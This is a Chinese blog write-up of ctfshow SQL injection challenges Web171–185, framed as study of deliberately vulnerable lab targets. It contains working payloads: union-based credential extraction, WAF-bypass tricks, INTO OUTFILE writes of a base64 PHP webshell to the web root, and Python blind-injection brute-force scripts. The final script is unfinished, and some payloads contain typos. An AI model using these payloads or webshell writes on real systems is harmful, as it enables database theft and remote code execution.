class="toc-text">Web201</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%A2%98%E7%9B%AE-18"><span class="toc-text">1、题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81payload-16"><span class="toc-text">2、payload</span></a></li></ol></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="无过滤注入："><a href="#无过滤注入：" class="headerlink" title="无过滤注入："></a>无过滤注入：</h1><h2 id="Web171：无任何条件"><a href="#Web171：无任何条件" class="headerlink" title="Web171：无任何条件"></a>Web171：无任何条件</h2><h3 id="1、题目"><a href="#1、题目" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
$sql = &quot;select id,username,password from user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
</code></pre>
<h3 id="2、payload"><a href="#2、payload" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）没有任何过滤，直接使用万能钥匙解</p>
<pre><code class="sql">999’ or 1=1 %23 

999&#39; or username=&#39;flag

999&#39; or id=&#39;26
</code></pre>
<p>（2）使用联合查询</p>
<pre><code class="sql">999‘ union select 1,2,password from user where username = &#39;flag
</code></pre>
<h2 id="Web172：列不能有flag字符串"><a href="#Web172：列不能有flag字符串" class="headerlink" title="Web172：列不能有flag字符串"></a>Web172：列不能有flag字符串</h2><h3 id="1、题目-1"><a href="#1、题目-1" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
$sql = &quot;select id,username,password from ctfshow_user2 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">//检查结果是否有flag
    if($row-&gt;username!==&#39;flag&#39;)&#123;
      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
    &#125;   
</code></pre>
<h3 id="2、知识点"><a href="#2、知识点" class="headerlink" title="2、知识点"></a>2、知识点</h3><p>union联合查询：是对结果集进行并集</p>
<blockquote>
<p>select * from user where id&#x3D;’1’ union select * from user where id&#x3D;’2’;</p>
<p>查询用户表中id是1和2的信息</p>
</blockquote>
<h3 id="3、payload"><a href="#3、payload" class="headerlink" title="3、payload"></a>3、payload</h3><pre><code class="sql">9999&#39; union select id, password from ctfshow_user2 where id = &#39;26
</code></pre>
<h2 id="Web173：过滤flag字符串"><a href="#Web173：过滤flag字符串" class="headerlink" title="Web173：过滤flag字符串"></a>Web173：过滤flag字符串</h2><h3 id="1、题目-2"><a href="#1、题目-2" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
$sql = &quot;select id,username,password from ctfshow_user2 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">//检查结果是否有flag
    if(!preg_match(&#39;/flag/i&#39;, json_encode($ret)))&#123;
      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
    &#125;
</code></pre>
<h3 id="2、payload-1"><a href="#2、payload-1" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）它会对返回的结果进行检测，返回的结果不包含flag字符串，由于ctfshow中的flag的结果是以ctfshow开头的，其实无关紧要只要读取password即可</p>
<pre><code class="sql">9999&#39; union select id, 2, password from ctfshow_user3 where username=&#39;flag
</code></pre>
<p>（2）或者将username的结果转换成hex十六进制，转换后显然不可能包含flag字符串了</p>
<pre><code class="sql">9999&#39; union select id, hex(username), password from ctfshow_user3 where username=&#39;flag
</code></pre>
<h2 id="Web174：过滤”flag”以及数字"><a href="#Web174：过滤”flag”以及数字" class="headerlink" title="Web174：过滤”flag”以及数字"></a>Web174：过滤”flag”以及数字</h2><h3 id="1、题目-3"><a href="#1、题目-3" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
$sql = &quot;select username,password from ctfshow_user4 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">//检查结果是否有flag
    if(!preg_match(&#39;/flag|[0-9]/i&#39;, json_encode($ret)))&#123;
      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
    &#125;  
</code></pre>
<h3 id="2、payload-2"><a href="#2、payload-2" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）首先题目过滤掉了数字以及flag字符串，那么输出的flag当中显然要是不包含数字的，所以想到接收到数据以后对数字进行替换，这样打印出来的内容就可以输出出来了，这里使用replace函数进行替换</p>
<p>（2）replace函数有三个参数，第一个参数表示所要修改的整个字符串集，第二个表示要替换的字符，第三个表示把第二个替换成什么字符</p>
<p>（3）将结果进行替换，最后打印时再进行还原：：</p>
<pre><code class="sql">999&#39; union select &#39;a&#39;, replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password, &#39;1&#39;, &#39;!&#39;), &#39;2&#39;, &#39;@&#39;), &#39;3&#39;, &#39;#&#39;), &#39;4&#39;, &#39;$&#39;),&#39;5&#39;,&#39;%&#39;),&#39;6&#39;, &#39;^&#39;), &#39;7&#39;, &#39;&amp;&#39;), &#39;8&#39;, &#39;*&#39;), &#39;9&#39;, &#39;(&#39; ), &#39;0&#39;, &#39;)&#39;) as &#39;re&#39; from ctfshow_user4 where username = &#39;flag
</code></pre>
<p>（4）或者将payload进行url解码，防止收到特殊符号的影响：</p>
<pre><code class="http">%39%39%39%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%27%61%27%2c%20%72%65%70%6c%61%63%65%28%72%65%70%6c%61%63%65%28%72%65%70%6c%61%63%65%28%72%65%70%6c%61%63%65%28%72%65%70%6c%61%63%65%28%72%65%70%6c%61%63%65%28%72%65%70%6c%61%63%65%28%72%65%70%6c%61%63%65%28%72%65%70%6c%61%63%65%28%72%65%70%6c%61%63%65%28%70%61%73%73%77%6f%72%64%2c%20%27%31%27%2c%20%27%21%27%29%2c%20%27%32%27%2c%20%27%40%27%29%2c%20%27%33%27%2c%20%27%23%27%29%2c%20%27%34%27%2c%20%27%24%27%29%2c%27%35%27%2c%27%25%27%29%2c%27%36%27%2c%20%27%5e%27%29%2c%20%27%37%27%2c%20%27%26%27%29%2c%20%27%38%27%2c%20%27%2a%27%29%2c%20%27%39%27%2c%20%27%28%27%20%29%2c%20%27%30%27%2c%20%27%29%27%29%20%61%73%20%27%72%65%27%20%66%72%6f%6d%20%63%74%66%73%68%6f%77%5f%75%73%65%72%34%20%77%68%65%72%65%20%75%73%65%72%6e%61%6d%65%20%3d%20%27%66%6c%61%67
</code></pre>
<p>注意点：</p>
<blockquote>
<p>① &amp;、#是特殊符号，不能直接使用，#会注释掉后面的内容，&amp;会分隔后面的内容（url当中），所以payload最好进行一次url编码，以防止出错。遇到问题使用bp抓包查看发送的内容是否准确</p>
</blockquote>
<h2 id="Web175：过滤掉所有的字符"><a href="#Web175：过滤掉所有的字符" class="headerlink" title="Web175：过滤掉所有的字符"></a>Web175：过滤掉所有的字符</h2><h3 id="1、题目-4"><a href="#1、题目-4" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code>//拼接sql语句查找指定ID用户
$sql = &quot;select username,password from ctfshow_user5 where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
      
</code></pre>
<p>返回逻辑</p>
<pre><code>//检查结果是否有flag
    if(!preg_match(&#39;/[\x00-\x7f]/i&#39;, json_encode($ret)))&#123;
      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
    &#125;
</code></pre>
<h3 id="2、payload-3"><a href="#2、payload-3" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）首先根据正则表达式可以发现：过滤掉了所有的ASCII码表0~127位的字符，包括数字，英文等等。显然不可能再输出数据到页面上了。 所以利用的思路就是接收到的内容写进一个文件里面，然后再读取该文件，这里需要用到 into outfile语句了</p>
<p>（2）into outfile 语句：</p>
<ul>
<li>把表数据导入到一个文本文件当中，这里显然可以将获得的内容读取出来</li>
<li>将表中的数据读取到文本文件中，如果这个数据是一句话木马，而文本是php文件，就可以实现远程代码执行了。不过实现的要求很严格<ul>
<li>具有root权限</li>
<li>在数据库配置文件中，配置项含有：secure_file_priv&#x3D;’’。（而在数据库中默认此项为null）</li>
<li>知道数据库的绝对路径</li>
</ul>
</li>
</ul>
<p>（3）使用第一种方式，将读取的数据导入到文本文件当中然后再查看</p>
<pre><code class="sql">999&#39; union select username, password from ctfshow_user5 into outfile &#39;/var/www/html/flag.txt&#39; --+
</code></pre>
<p>（4）尝试看看能不能将一句话木马写入到服务器当中，发现可以实现</p>
<pre><code class="sql">1&#39; union select 1, from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;) into outfile &#39;/var/www/html/1.php
</code></pre>
<h1 id="过滤注入："><a href="#过滤注入：" class="headerlink" title="过滤注入："></a>过滤注入：</h1><h2 id="Web176：过滤select、ctfshow"><a href="#Web176：过滤select、ctfshow" class="headerlink" title="Web176：过滤select、ctfshow"></a>Web176：过滤select、ctfshow</h2><h3 id="1、题目-5"><a href="#1、题目-5" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="sql">//拼接sql语句查找指定ID用户
$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
      
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">//对传入的参数进行了过滤
  function waf($str)&#123;
   //代码过于简单，不宜展示
  &#125;
</code></pre>
<h3 id="2、payload-4"><a href="#2、payload-4" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）首先使用万能钥匙进行检测，发现可以直接得到shell</p>
<pre><code class="sql">999&#39; or 1=1 %23
</code></pre>
<p>（2）然后利用常见的sql语句进行测试，发现select语句无法使用，猜测waf过滤掉了select，改用Select大小，显示出结果</p>
<pre><code class="sql">99&#39; union select 1,2,3 --+

99&#39; union Select 1,2,3 --+
</code></pre>
<p>（3）利用联合查询直接打印结果</p>
<pre><code class="sql">99&#39; union Select 1,2,password from ctfshow_user where username=&#39;flag
</code></pre>
<p>（4）所以尝试写一句话木马进服务器来查看源码。竟然写进去了</p>
<pre><code class="sql">99&#39; union Select 1,2,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;) into outfile &#39;/var/www/html/1.php&#39; --+ 
</code></pre>
<p>（5）查看源码：只过滤掉了select以及ctfshow</p>
<img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220713193828812.png" alt="image-20220713193828812" style="zoom:150%;" />



<h2 id="Web177：过滤空格"><a href="#Web177：过滤空格" class="headerlink" title="Web177：过滤空格"></a>Web177：过滤空格</h2><h3 id="1、题目-6"><a href="#1、题目-6" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
      
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">//对传入的参数进行了过滤
  function waf($str)&#123;
   //代码过于简单，不宜展示
  &#125;
      
</code></pre>
<h3 id="2、payload-5"><a href="#2、payload-5" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）首先使用万能钥匙查看，发现没有出现任何结果，可能是过滤掉了or或者是空格</p>
<pre><code class="sql">999&#39; or 1=1 %23
</code></pre>
<p>（2）将空格换成&#x2F;**&#x2F;得到结果</p>
<pre><code class="sql">999&#39;/**/or/**/1=1/**/%23
</code></pre>
<p>（3）再次尝试测试使用select查看，发现没有过滤掉select</p>
<pre><code>999&#39;/**/union/**/select/**/1,2,3/**/%23
</code></pre>
<p>（4）尝试将一句话木马写进服务器当中,写入成功，并且没有涉及到其余过滤的问题</p>
<pre><code class="sql">999&#39;/**/union/**/select/**/1,2,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;)/**/into/**/outfile/**/&#39;/var/www/html/1.php&#39;/**/%23
</code></pre>
<p>（5）发现就过滤掉了空格（%20也不行）</p>
<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220714094708518.png" alt="image-20220714094708518"></p>
<h2 id="Web178：过滤空格以及"><a href="#Web178：过滤空格以及" class="headerlink" title="Web178：过滤空格以及*"></a>Web178：过滤空格以及*</h2><h3 id="1、题目-7"><a href="#1、题目-7" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
      
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">//对传入的参数进行了过滤
  function waf($str)&#123;
   //代码过于简单，不宜展示
  &#125;
</code></pre>
<h3 id="2、payload-6"><a href="#2、payload-6" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）空格过滤，使用&#x2F;**&#x2F;发现被过滤。使用%09代替空格成功回显</p>
<pre><code class="sql">999&#39;%09or%091=1%09%23
</code></pre>
<p>（2）尝试查看select是否被过滤，发现没有</p>
<pre><code class="sql">999&#39;%09union%09select%091,2,3%09%23
</code></pre>
<p>（3）写入一句话木马</p>
<pre><code class="sql">999&#39;%09union%09select%091,2,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;)%09into%09outfile%09&#39;/var/www/html/1.php&#39;%09%23
</code></pre>
<p>（4）源码查看</p>
<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220714100039465.png" alt="image-20220714100039465"></p>
<h2 id="Web179：过滤"><a href="#Web179：过滤" class="headerlink" title="Web179：过滤"></a>Web179：过滤</h2><h3 id="1、题目-8"><a href="#1、题目-8" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
      
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">//对传入的参数进行了过滤
  function waf($str)&#123;
   //代码过于简单，不宜展示
  &#125;
</code></pre>
<h3 id="2、payload-7"><a href="#2、payload-7" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）把空格换成0c可以直接绕过</p>
<pre><code class="sql">999&#39;%0cor%0c1=1%0c%23
</code></pre>
<p>（2）直接写入一句话木马</p>
<pre><code class="sql">999&#39;%0cunion%0cselect%0c1,2,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;)%0cinto%0coutfile%0c&#39;/var/www/html/1.php&#39;%0c%23
</code></pre>
<p>（3）查看源码：发现存在问题 &#x3D;&#x3D;&#x3D;&#x3D;》0c不是过滤掉了吗，为什么还能绕过</p>
<img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220714100809368.png" alt="image-20220714100809368" style="zoom:150%;" />









<h2 id="Web180：只有-0c代替空格"><a href="#Web180：只有-0c代替空格" class="headerlink" title="Web180：只有%0c代替空格"></a>Web180：只有%0c代替空格</h2><h3 id="1、题目-9"><a href="#1、题目-9" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
      
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">//对传入的参数进行了过滤
  function waf($str)&#123;
   //代码过于简单，不宜展示
  &#125;
      
</code></pre>
<h3 id="2、payload-8"><a href="#2、payload-8" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）首先使用万能公式查看，发现被过滤了</p>
<pre><code class="sql">999&#39;%0cor%0c1=1%0c%23
</code></pre>
<p>（2）使用select联合查询，发现还是被过滤掉了，猜测可能是%0c被过滤掉了（不知道怎么绕过）</p>
<pre><code class="sql">999&#39;%0cunion%0cselect%0c1,2,3%0c%2
</code></pre>
<p>（3）又猜测过滤掉了数字，于是使用字母，然后把后面注释去掉，发现有回显。最终发现是过滤掉了%23</p>
<pre><code>999&#39;%0cunion%0cselect%0c&#39;a&#39;,&#39;b&#39;,&#39;c
</code></pre>
<p>目前测试的结论：过滤掉了#、空格。%0c、select、数字没有被过滤</p>
<p>（4）注释符不可使用，只能使用单引号闭合了，那么此时万能钥匙也不可使用，因为后面有limit‘限制，就只能使用常规的方式读取出来了</p>
<pre><code class="sql">999&#39;%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&#39;flag
</code></pre>
<p>（5）写入一句话木马</p>
<pre><code class="sql">999&#39;%0cunion%0cselect%0c1,2,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;)%0cinto%0coutfile%0c&#39;/var/www/html/1.php
</code></pre>
<p>（6）查看源码：过滤掉了除0xc以外的空格、注释符、*号、</p>
<p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220714102501924.png" alt="image-20220714102501924"></p>
<p>（7）注意点：</p>
<blockquote>
<p>\0x0c 并不等于 \x0c， \0x0c并不会过滤掉0c，虽然原因不知道为什么？？？？？？</p>
</blockquote>
<h2 id="Web181：运算符绕过"><a href="#Web181：运算符绕过" class="headerlink" title="Web181：运算符绕过"></a>Web181：运算符绕过</h2><h3 id="1、题目-10"><a href="#1、题目-10" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
      
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">//对传入的参数进行了过滤
  function waf($str)&#123;
    return preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#39;, $str);
  &#125;
</code></pre>
<h3 id="2、payload-9"><a href="#2、payload-9" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）空格全部被过滤掉了，而且不能使用select语句，这样union也无法使用了。而且注释符也被过滤掉了，也就是说只能打印一行数据</p>
<pre><code class="sql">999&#39;or(id=26)and&#39;1&#39;=&#39;1
</code></pre>
<p>（2）此时的sql语句就为</p>
<pre><code class="sql">where username !=&#39;flag&#39; and id=&#39;999&#39; or id=26 and &#39;1&#39;=&#39;1&#39; limit 1;
</code></pre>
<p>（3）又根据and的优先级大于or的优先级，那么此时前半部分为0，会执行后半部分，而后半部分符合，所以它就会打印出id为26的那一行的数据，太巧了</p>
<pre><code class="sql">where (username !=&#39;flag&#39; and id=&#39;999&#39;) or (id=26 and &#39;1&#39;=&#39;1&#39;) limit 1;
</code></pre>
<h2 id="Web182：与181类似"><a href="#Web182：与181类似" class="headerlink" title="Web182：与181类似"></a>Web182：与181类似</h2><h3 id="1、题目-11"><a href="#1、题目-11" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
$sql = &quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;
      
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">//对传入的参数进行了过滤
  function waf($str)&#123;
    return preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#39;, $str);
  &#125;  
</code></pre>
<h3 id="2、payload-10"><a href="#2、payload-10" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）相比较前面那道题而言多过滤了一个flag字符串，拿前面的payload直接打就行</p>
<pre><code class="sql">999&#39;or(id=26)and&#39;1&#39;=&#39;1
</code></pre>
<h2 id="Web183：布尔盲注"><a href="#Web183：布尔盲注" class="headerlink" title="Web183：布尔盲注"></a>Web183：布尔盲注</h2><h3 id="1、题目-12"><a href="#1、题目-12" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
  $sql = &quot;select count(pass) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;
      
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">//对传入的参数进行了过滤
  function waf($str)&#123;
    return preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#39;, $str);
  &#125;

      
</code></pre>
<p>查询结果</p>
<pre><code class="php">//返回用户表的记录总数
      $user_count = 0;
</code></pre>
<h3 id="2、payload-11"><a href="#2、payload-11" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）首先，程序只会打印出查询出来的数量，我们只能通过返回出来的数量来确定是否查询成功。我们通过测试，可以发现表名为ctfshow_user</p>
<pre><code class="sql">tableName=(ctfshow_user)
</code></pre>
<p><img src="/img/image-20220714140322101.png" alt="image-20220714140322101"></p>
<p>（2）查询表名下面pass列的内容，爆破它的每一个字符 通过返回数量的结果来进行判断是否正确，&#x3D;&#x3D;》这就是布尔盲注，首先确定前面几个字节是ctfshow{，测试编写的语句是否，准确，经过测试发现可行，然后就用python脚本逐一爆破</p>
<pre><code class="sql">tableName=(ctfshow_user)where(pass)like&#39;c%25&#39;
tableName=(ctfshow_user)where(pass)like&#39;ct%25&#39;
tableName=(ctfshow_user)where(pass)like&#39;ctf%25&#39;
</code></pre>
<p><img src="/img/image-20220714140556079.png" alt="image-20220714140556079"></p>
<p>（3）写python脚本如下</p>
<pre><code class="python">from urllib import response
import requests
import time

url = &quot;http://81b26ac9-4239-4971-bd67-b9015ddedb25.challenge.ctf.show/select-waf.php&quot;
flagdir = &quot;&#125;abcdefghijklmnopqrstuvwxyz-0123456789&#123;&quot;    # 字典
payload = &quot;(ctfshow_user)where(pass)like\&quot;&#123;&#125;%\&quot;&quot; # payload
flag=&quot;ctfshow&#123;&quot;         # 爆破获得的flag


for i in range(0, 40):
    for x in flagdir:
        data = &#123;
            &quot;tableName&quot;:payload.format(flag+x)      # 爆破内容
        &#125;
        response = requests.post(url, data=data)    #发送
        time.sleep(0.3)
        if response.text.find(&quot;user_count = 1&quot;)&gt;0:  #如果接收到user_count = 1，就说明爆破正确，flag字符串拼接，然后爆下一个字符
            flag+=x
            break
        else:
            continue
    print(flag)
</code></pre>
<p>（4）python语法</p>
<p>① requests库</p>
<p>② format函数</p>
<p>③ 字典、列表以及</p>
<h2 id="Web184"><a href="#Web184" class="headerlink" title="Web184"></a>Web184</h2><h3 id="1、题目-13"><a href="#1、题目-13" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
  $sql = &quot;select count(*) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;
      
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">//对传入的参数进行了过滤
  function waf($str)&#123;
    return preg_match(&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\`|sleep|benchmark/i&#39;, $str);
  &#125;

      
</code></pre>
<p>查询结果</p>
<pre><code class="php">//返回用户表的记录总数
      $user_count = 0;
</code></pre>
<h3 id="2、payload-12"><a href="#2、payload-12" class="headerlink" title="2、payload"></a>2、payload</h3><p>（1）相比较上一道题，它多过滤掉了where、sleep、union、select，但是该题没有过滤掉空格，非常好。这里利用的方式是group by语句进行绕过</p>
<pre><code class="sql">tableName=ctfshow_user group by pass having pass like 0x6325
</code></pre>
<p>（2）group by 是分组操作， 后面跟上的是having（它俩一般一起），having是在查询结果返回结果集以后对查询结果进行过滤操作， 它的作用相当于where，但与where存在一定区别（<a target="_blank" rel="noopener" href="https://blog.csdn.net/yajie_china/article/details/80089553%EF%BC%89">https://blog.csdn.net/yajie_china/article/details/80089553）</a></p>
<p>（3）同时，由于这里过滤掉了单引号和双引号，所以需要用十六进制进行绕过</p>
<p>（4）python脚本：</p>
<pre><code class="python">from urllib import response
from pip import main
import requests
import time

url = &quot;http://a82772ea-f993-4348-89c8-162b2848cc13.challenge.ctf.show/select-waf.php&quot;
flagdir = &quot;&#125;0123456789-abcdefghijklmnopqrstuvwxyz&#123;&quot;    # 字典
payload = &quot;ctfshow_user group by pass having pass like 0x&#123;&#125;25&quot; # payload
flag=&quot;ctfshow&#123;&quot;         # 爆破获得的flag

def str2hex(str): # 将字符串转换成十六进制，它首先遍历每一个字符，然后将其转换成ASCII码值，最后再去掉0x
    a = &quot;&quot;
    for i in str:
        a += hex(ord(i))
    return a.replace(&quot;0x&quot;, &quot;&quot;)


for i in range(0, 40):
    for x in flagdir:
        data = &#123;
            &quot;tableName&quot;:payload.format(str2hex(flag+x))      # 爆破内容
        &#125;
        response = requests.post(url, data=data)    #发送
        time.sleep(0.3)
        if response.text.find(&quot;user_count = 1&quot;)&gt;0:  #如果接收到user_count = 1，就说明爆破正确，flag字符串拼接，然后爆下一个字符
            flag+=x
            if(x==&#39;&#125;&#39;):
                exit()
            break
        else:
            continue
        
    print(flag)
</code></pre>
<h2 id="Web185"><a href="#Web185" class="headerlink" title="Web185"></a>Web185</h2><h3 id="1、题目-14"><a href="#1、题目-14" class="headerlink" title="1、题目"></a>1、题目</h3><p>查询语句</p>
<pre><code class="php">//拼接sql语句查找指定ID用户
  $sql = &quot;select count(*) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;
      
</code></pre>
<p>返回逻辑</p>
<pre><code class="php">//对传入的参数进行了过滤
  function waf($str)&#123;
    return preg_match(&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\`|sleep|benchmark/i&#39;, $str);
  &#125;
</code></pre>
<p>查询结果</p>
<pre><code class="php">//返回用户表的记录总数
      $user_count = 0;
</code></pre>
<h3 id="2、知识点-1"><a href="#2、知识点-1" class="headerlink" title="2、知识点"></a>2、知识点</h3><p>（1）substr函数(string, pos, len)</p>
<p>主要是用于截取对应字段指定长度</p>
<ul>
<li>string：指定字符串</li>
<li>pos：规定字符串从何处开始（这里是从1开始的而不是0），为正数从开头开始，为负数从结尾开始</li>
<li>len：要截取字符串的长度（从1开始计数）</li>
</ul>
<p>（2）regexp运算符</p>
<p>它是正则表达式（regular expression）的缩写，使用的方式如下，但是除了sql语句正常的%与_以外，正则表达式的那些语法均能使用</p>
<pre><code class="sql">select * from user where username like &quot;%la%&quot;;

select * from user where username regexp &quot;%la%&quot;;

# ^：查找的字符串以什么开头：输入的名字必须以flag开头
select *from user where username regexp &quot;^flag&quot;

# $:查找的字符串以什么结尾：查找的姓名必须以 &#125; 结尾
select *from user where username regexp &quot;&#125;$&quot;

# |:表示多个搜索方式：查询姓名以flag开头或者是以&#125;结尾的
select *from user where username regexp &quot;^flag|&#125;$&quot;
</code></pre>
<h3 id="3、payload-1"><a href="#3、payload-1" class="headerlink" title="3、payload"></a>3、payload</h3><p>（1）相比较前面那道题而言，它又多过滤掉了数字，那显然不能用十六进制的形式了，此时想到的是最开始无过滤的那道题是将数字进行转换</p>
<pre><code class="sql">ctfshow_user a right join ctfshow_user b on substr(b.pass,&#123;&#125;,&#123;&#125;)regexp(char(&#123;&#125;))
</code></pre>
<p>绕过失败，待填充</p>
<pre><code class="python">from operator import truediv
from urllib import response
from pip import main
import requests
import time

url = &quot;http://02817032-aa54-4f85-84b4-269cec369265.challenge.ctf.show/select-waf.php&quot;
flagdir = &quot;t&#125;0123456789-abcdefghijklmnopqrstuvwxyz&#123;t&quot;    # 字典
payload = &quot;ctfshow_user group by pass having pass like &#123;&#125;&quot; # payload
# ctfshow_user as a right jion ctfshow_user as b on regexp()


def formatString(str):
    temp = &quot;concat(&quot;
    for x in str:
        temp += char2boolean(x)     
    return temp[:-1] + &quot;)&quot;

def char2boolean(ch):
    num = ord(ch)
    temp = &quot;char(&quot;
    for x in range(num):
        temp += &quot;true+&quot;
    return temp[:-1] + &quot;),&quot;

def main():
    flag=&quot;&quot;         # 爆破获得的flag
    for i in range(0, 1):
        for x in flagdir:
            data = &#123;
                &quot;tableName&quot;:payload.format(formatString(flag+x+&#39;%&#39;))      # 爆破内容
            &#125;
            # print(data)
            response = requests.post(url, data=data)    #发送
            time.sleep(0.3)
